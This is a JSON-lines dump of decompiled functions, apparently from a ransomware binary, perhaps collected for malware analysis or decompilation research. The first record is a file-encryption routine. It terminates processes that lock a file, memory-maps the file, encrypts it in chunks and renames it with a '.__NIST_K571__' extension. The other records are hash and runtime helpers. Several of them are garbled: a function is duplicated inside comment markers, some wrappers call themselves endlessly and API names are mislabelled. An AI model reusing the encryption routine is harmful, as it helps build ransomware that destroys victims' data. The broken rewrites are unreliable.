{\nTerminateProcess(pvVar2,0);\nWaitForSingleObject(pvVar2,5000);\nCloseHandle(pvVar2);\n}\n}\n}\n}\nRmEndSession(local_1a68);\nbVar1 = false;\n}\nGetFileSizeEx(pvVar2,&local_1a7c);\nhFileMappingObject = CreateFileMappingA(pvVar2,(LPSECURITY_ATTRIBUTES)0x0,4,0,0,(LPCSTR)0x0);\nif (hFileMappingObject != (HANDLE)0x0) {\nif ((local_1a7c.s.HighPart < 0) ||\n((local_1a7c.s.HighPart < 1 && (local_1a7c.s.LowPart < 0x2800001)))) {\nif ((-1 < local_1a7c.s.HighPart) &&\n(((0 < local_1a7c.s.HighPart || (local_1a7c.s.LowPart != 0)) &&\n(pvVar3 = MapViewOfFile(hFileMappingObject,0xf001f,0,0,local_1a7c.s.LowPart),\npvVar3 != (LPVOID)0x0)))) {\nFUN_00402eb0(0x408398,0x14,0x4083d8,(int)pvVar3,(int)pvVar3,local_1a7c.s.LowPart);\nFUN_00402eb0(0x4083b8,0x14,0x4083d8,(int)pvVar3,(int)pvVar3,local_1a7c.s.LowPart);\nUnmapViewOfFile(pvVar3);\n}\n}\nelse {\nuVar6 = __alldiv(local_1a7c.s.LowPart,local_1a7c.s.HighPart,0xa00000,0);\nuVar6 = __alldiv((uint)uVar6,(uint)((ulonglong)uVar6 >> 0x20),3,0);\nlocal_1aa0 = 0;\nwhile( true ) {\nif ((0 < (int)local_1aa0._4_4_) || ((-1 < local_1aa0 && (2 < (uint)local_1aa0)))) break;\nlocal_1aa8 = (uint)((ulonglong)uVar6 >> 0x20);\nlocal_1aac = (uint)uVar6;\nlVar7 = __allmul((uint)local_1aa0,local_1aa0._4_4_,local_1aac,local_1aa8);\nlVar7 = __allmul((uint)lVar7,(uint)((ulonglong)lVar7 >> 0x20),0xa00000,0);\nlocal_1ab4 = (DWORD)lVar7;\npvVar3 = MapViewOfFile(hFileMappingObject,0xf001f,(DWORD)((ulonglong)lVar7 >> 0x20),\nlocal_1ab4,0xa00000);\nif (pvVar3 != (LPVOID)0x0) {\nFUN_00402eb0(0x408398,0x14,0x4083d8,(int)pvVar3,(int)pvVar3,0xa00000);\nFUN_00402eb0(0x4083b8,0x14,0x4083d8,(int)pvVar3,(int)pvVar3,0xa00000);\nUnmapViewOfFile(pvVar3);\n}\nlocal_1aa0 = CONCAT44(local_1aa0._4_4_ + (0xfffffffe < (uint)local_1aa0),\n(uint)local_1aa0 + 1);\n}\n}\nCloseHandle(hFileMappingObject);\n}\nFlushFileBuffers(pvVar2);\nCloseHandle(pvVar2);\nlpString1 = (LPWSTR)FUN_00404fc0(0x10000);\nif (lpString1 != (LPWSTR)0x0) {\nlstrcpyW(lpString1,param_1);\nlstrcatW(lpString1,L\".__NIST_K571__\");\nMoveFileExW(param_1,lpString1,9);\nFUN_00404f90(lpString1);\n}\nLAB_00404610:\n___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_4c : undefined1\nLocal Variable: local_1a64 : undefined1\nLocal Variable: local_1a68 : undefined4\nLocal Variable: local_1a6c : undefined4\nLocal Variable: local_1a70 : undefined1\nLocal Variable: local_1a74 : undefined1\nLocal Variable: local_1a78 : undefined4\nLocal Variable: local_1a7c : undefined4\nLocal Variable: local_1a80 : undefined4\nLocal Variable: local_1a84 : undefined4\nLocal Variable: local_1a88 : undefined4\nLocal Variable: local_1a8c : undefined4\nLocal Variable: local_1a90 : undefined4\nLocal Variable: local_1a94 : undefined4\nLocal Variable: local_1a98 : undefined4\nLocal Variable: local_1aa0 : undefined8\nLocal Variable: local_1aa4 : undefined4\nLocal Variable: local_1aa8 : undefined4\nLocal Variable: local_1aac : undefined4\nLocal Variable: local_1ab0 : undefined4\nLocal Variable: local_1ab4 : undefined4"}
{"Function Name": "FUN_00404f90", "Address": "00404f90", "Source Code": "void __cdecl FUN_00404f90(LPVOID memoryPointer)\n{\n    \n    EnterCriticalSection((LPCRITICAL_SECTION)&criticalSection);\n    \n    \n    HeapFree(GetProcessHeap(), 0, memoryPointer);\n    \n    \n    LeaveCriticalSection((LPCRITICAL_SECTION)&criticalSection);\n}"}
{"Function Name": "FUN_00405000", "Address": "00405000", "Source Code": "void __cdecl FUN_00405000(int base_address, undefined value, uint count)\n{\n    \n    for (uint index = 0; index < count; index++) {\n        \n        *(undefined *)(base_address + index) = value;\n    }\n}"}
{"Function Name": "und_memcpy", "Address": "00405030", "Source Code": "void __cdecl und_memcpy(char *destination, char *source, uint num_bytes)\n{\n    \n    for (uint index = 0; index < num_bytes; index++) {\n        \n        destination[index] = source[index];\n    }\n}"}
{"Function Name": "FUN_00405070", "Address": "00405070", "Source Code": "\\*\nundefined * __cdecl FUN_00405070(undefined *source_ptr, undefined *dest_ptr, int count)\n{\n    \n    if (dest_ptr < source_ptr) {\n        \n        dest_ptr += count;\n        source_ptr += count;\n        \n        while (count != 0) {\n            \n            dest_ptr--;\n            source_ptr--;\n            \n            *source_ptr = *dest_ptr;\n            \n            count--;\n        }\n    } else {\n        \n        while (count != 0) {\n            \n            *source_ptr = *dest_ptr;\n            \n            source_ptr++;\n            dest_ptr++;\n            \n            count--;\n        }\n    }\n    \n    return source_ptr;\n}\n*\\ \n \nundefined * __cdecl FUN_00405070(undefined *source_ptr, undefined *dest_ptr, int count)\n{\n    if (dest_ptr < source_ptr) {\n        dest_ptr += count;\n        source_ptr += count;\n        while (count != 0) {\n            dest_ptr--;\n            source_ptr--;\n            *source_ptr = *dest_ptr;\n            count--;\n        }\n    } else {\n        while (count != 0) {\n            *source_ptr = *dest_ptr;\n            source_ptr++;\n            dest_ptr++;\n            count--;\n        }\n    }\n    return source_ptr;\n}"}
{"Function Name": "FUN_004051c0", "Address": "004051c0", "Source Code": "void __cdecl FUN_004051c0(uint *data_array, undefined *source_pointer, int counter)\n{\n    \n    uint index = data_array[8] & 0x3f;\n    \n    while (counter != 0) {\n        \n        *(undefined *)((int)data_array + index + 0x28) = *source_pointer;\n        \n        \n        index++;\n        \n        \n        source_pointer++;\n        \n        \n        index = data_array[8]++;\n        \n        \n        data_array[9] += (uint)(0xfffffffe < index);\n        \n        \n        counter--;\n        \n        if (index == 0x40) {\n            index = 0;\n            FUN_00407150(data_array);\n        }\n    }\n}"}
{"Function Name": "FUN_00405240", "Address": "00405240", "Source Code": "void __cdecl FUN_00405240(uint *inputArray, undefined *outputBuffer)\n{\n    ulonglong shiftedValue; \n    undefined8 shiftedValue64 = __allshl(3, inputArray[9]); \n    uint bitIndex = inputArray[8] & 0x3f; \n    *(undefined *)((int)inputArray + bitIndex + 0x28) = 0x80; \n    while (++bitIndex != 0x38) { \n        bitIndex &= 0x3f; \n        if (bitIndex == 0) { \n            FUN_00407150(inputArray);\n        }\n        *(undefined *)((int)inputArray + bitIndex + 0x28) = 0; \n    }\n    for (uint loopCounter = 0; loopCounter < 8; loopCounter++) { \n        shiftedValue = __aullshr(0x38, shiftedValue64._4_4_); \n        *(char *)((int)inputArray + bitIndex + 0x28) = (char)shiftedValue; \n        bitIndex++; \n        shiftedValue64 = __allshl(8, shiftedValue64._4_4_); \n    }\n    FUN_00407150(inputArray); \n    for (loopCounter = 0; loopCounter < 8; loopCounter++) { \n        outputBuffer[0] = (char)(inputArray[loopCounter] >> 0x18); \n        outputBuffer[1] = (char)(inputArray[loopCounter] >> 0x10); \n        outputBuffer[2] = (char)(inputArray[loopCounter] >> 8); \n        outputBuffer[3] = *(undefined *)(inputArray + loopCounter); \n        outputBuffer += 4; \n    }\n    FUN_00405110(inputArray); \n}"}
{"Function Name": "__alldiv", "Address": "00407200", "Source Code": "undefined8 __alldiv(uint firstParameter, uint secondParameter, uint thirdParameter, uint fourthParameter)\n{\n    ulonglong intermediateResult; \n    longlong productOfParam3AndQuotient; \n    uint firstParamCopy = firstParameter; \n    uint thirdParamCopy = thirdParameter; \n    uint secondParamCopy = secondParameter; \n    uint fourthParamCopy = fourthParameter; \n    int quotientResult; \n    bool isSecondParamNegative = (int)secondParameter < 0; \n    \n    if (isSecondParamNegative) {\n        isSecondParamNegative = firstParameter != 0; \n        firstParameter = -firstParameter; \n        secondParameter = -(uint)isSecondParamNegative - secondParameter; \n    }\n    \n    \n    if ((int)fourthParameter < 0) {\n        isSecondParamNegative = thirdParameter != 0; \n        thirdParameter = -thirdParameter; \n        fourthParameter = -(uint)isSecondParamNegative - fourthParameter; \n    }\n    \n    \n    if (fourthParameter == 0) {\n        firstParamCopy = secondParameter / thirdParameter; \n        quotientResult = (int)(((ulonglong)secondParameter % (ulonglong)thirdParameter << 0x20 | (ulonglong)firstParameter) / (ulonglong)thirdParameter); \n    } else {\n        \n        do {\n            fourthParamCopy >>= 1; \n            thirdParamCopy = thirdParamCopy >> 1 | (uint)((fourthParamCopy & 1) != 0) << 0x1f; \n            secondParamCopy >>= 1; \n            firstParamCopy = firstParamCopy >> 1 | (uint)((secondParamCopy & 1) != 0) << 0x1f; \n        } while (fourthParamCopy != 0); \n        \n        \n        intermediateResult = CONCAT44(secondParamCopy, firstParamCopy) / (ulonglong)thirdParamCopy; \n        quotientResult = (int)intermediateResult; \n        productOfParam3AndQuotient = (ulonglong)thirdParameter * (intermediateResult & 0xffffffff); \n        firstParamCopy = (uint)((ulonglong)productOfParam3AndQuotient >> 0x20); \n        thirdParamCopy = firstParamCopy + quotientResult * fourthParameter; \n        \n        \n        if (CARRY4(firstParamCopy, quotientResult * fourthParameter) || (secondParameter < thirdParamCopy) || (secondParameter <= thirdParamCopy && (firstParameter < (uint)productOfParam3AndQuotient))) {\n            quotientResult--; \n        }\n        firstParamCopy = 0; \n    }\n    \n    \n    if (isSecondParamNegative) {\n        quotientResult = -quotientResult; \n        firstParamCopy = -(uint)(quotientResult != 0) - firstParamCopy; \n    }\n    \n    return CONCAT44(firstParamCopy, quotientResult); \n}"}
{"Function Name": "__allmul", "Address": "004072b0", "Source Code": "longlong __allmul(uint multiplier_a, uint addend_b, uint multiplier_b, uint addend_a)\n{\n    \n    if ((addend_a | addend_b) == 0) {\n        \n        return (ulonglong)multiplier_a * (ulonglong)multiplier_b;\n    }\n    \n    return CONCAT44(\n        \n        (int)((ulonglong)multiplier_a * (ulonglong)multiplier_b >> 0x20) + addend_b * multiplier_b + multiplier_a * addend_a,\n        \n        (int)((ulonglong)multiplier_a * (ulonglong)multiplier_b)\n    );\n}"}
{"Function Name": "__alloca_probe", "Address": "004072f0", "Source Code": "void __alloca_probe(void) \n{\n    undefined4 *pointerToUndefined4; \n    undefined4 returnAddress; \n    undefined stackAllocation[4]; \n    \n    pointerToUndefined4 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX));\n    \n    \n    for (undefined4 *pointerToAlignedAddress = (undefined4 *)((uint)stackAllocation & 0xfffff000); pointerToUndefined4 < pointerToAlignedAddress; pointerToAlignedAddress -= 0x400) {\n        \n    }\n    \n    \n    *pointerToUndefined4 = returnAddress;\n}"}
{"Function Name": "__allshl", "Address": "00407320", "Source Code": "longlong __fastcall __allshl(byte shift_amount, int value)\n{\n    uint eax_value; \n    \n    if (shift_amount > 0x3f) {\n        return 0; \n    }\n    \n    \n    if (shift_amount < 0x20) {\n        \n        return CONCAT44(value << (shift_amount & 0x1f) | eax_value >> (0x20 - (shift_amount & 0x1f)),\n                        eax_value << (shift_amount & 0x1f)); \n    }\n    \n    \n    return (ulonglong)(eax_value << (shift_amount & 0x1f)) << 0x20; \n}"}
{"Function Name": "__aullshr", "Address": "00407340", "Source Code": "ulonglong __fastcall __aullshr(byte shift_amount, uint value)\n{\n    \n    if (shift_amount > 0x3f) {\n        return 0; \n    }\n    \n    \n    if (shift_amount < 0x20) {\n        \n        return CONCAT44(value >> (shift_amount & 0x1f), \n                        value << (0x20 - (shift_amount & 0x1f)) >> (shift_amount & 0x1f));\n    }\n    \n    \n    return (ulonglong)(value >> (shift_amount & 0x1f));\n}"}
{"Function Name": "___raise_securityfailure", "Address": "0040735f", "Source Code": "void __cdecl ___raise_securityfailure(_EXCEPTION_POINTERS *exceptionPointers)\n{\n    \n    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);\n    \n    \n    UnhandledExceptionFilter(exceptionPointers);\n    \n    \n    TerminateProcess(GetCurrentProcess(), 0xc0000409);\n}"}
{"Function Name": "___report_gsfailure", "Address": "00407387", "Source Code": "void __cdecl ___report_gsfailure(void)\n{\n    code *functionPointer; \n    uint processorFeaturePresence; \n    undefined4 undefinedVar; \n    undefined8 combinedValue; \n    processorFeaturePresence = IsProcessorFeaturePresent(0x17); \n    combinedValue = CONCAT44(0, processorFeaturePresence); \n    if (processorFeaturePresence != 0) { \n        functionPointer = (code *)swi(0x29); \n        combinedValue = (*functionPointer)(); \n    }\n    highBitsValue = (undefined4)((ulonglong)combinedValue >> 0x20); \n    lowBitsValue = (undefined4)combinedValue; \n    processorFlags = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | \n                    (uint)(in_TF & 1) * 0x100 | (uint)(in_AF & 1) * 0x10 |\n                    (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000 |\n                    (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;\n    stackAddress = &stack0x00000004; \n    statusCode = 0x10001; \n    errorCode = 0xc0000409; \n    flagOne = 1; \n    flagTwo = 1; \n    valueTwo = 2; \n    returnAddress = unaff_retaddr; \n    gsRegisterValue = in_GS; \n    fsRegisterValue = in_FS; \n    esRegisterValue = in_ES; \n    dsRegisterValue = in_DS; \n    ediRegisterValue = unaff_EDI; \n    esiRegisterValue = unaff_ESI; \n    ebxRegisterValue = unaff_EBX; \n    undefinedVar3 = undefinedVar; \n    ebpRegisterValue = unaff_EBP; \n    returnAddressAgain = unaff_retaddr; \n    csRegisterValue = in_CS; \n    ssRegisterValue = in_SS; \n    ___raise_securityfailure((_EXCEPTION_POINTERS *)&PTR_DAT_004023c8); \n    return; \n}"}
{"Function Name": "KERNEL32.DLL::CreateToolhelp32Snapshot", "Address": "004071da", "Source Code": "void create_toolhelp_snapshot(void)\n{\n    \n    create_toolhelp_snapshot();\n}"}
{"Function Name": "KERNEL32.DLL::Process32FirstW", "Address": "004071e0", "Source Code": "void startProcess(void)\n{\n    \n    startProcess();\n}"}
{"Function Name": "KERNEL32.DLL::Process32NextW", "Address": "004071e6", "Source Code": "void processNext(void) \n{\n    processNext(); \n}"}
{"Function Name": "_guard_check_icall", "Address": "004074b6", "Source Code": "void check_icall_guard(void) {}"}
{"Function Name": "RSTRTMGR.DLL::RmRegisterResources", "Address": "004074a4", "Source Code": "void removeRegisteredResources(void)\n{\n    \n    return;\n}"}
{"Function Name": "RSTRTMGR.DLL::RmEndSession", "Address": "0040749e", "Source Code": "void removeEndSession(void) \n{\n    removeEndSession(); \n}"}
{"Function Name": "RSTRTMGR.DLL::RmStartSession", "Address": "00407498", "Source Code": "void removeSession(void) \n{\n    removeSession(); \n}"}
{"Function Name": "RSTRTMGR.DLL::RmGetList", "Address": "004074aa", "Source Code": "void removeGetList(void)\n{\n    \n    return;\n}"}
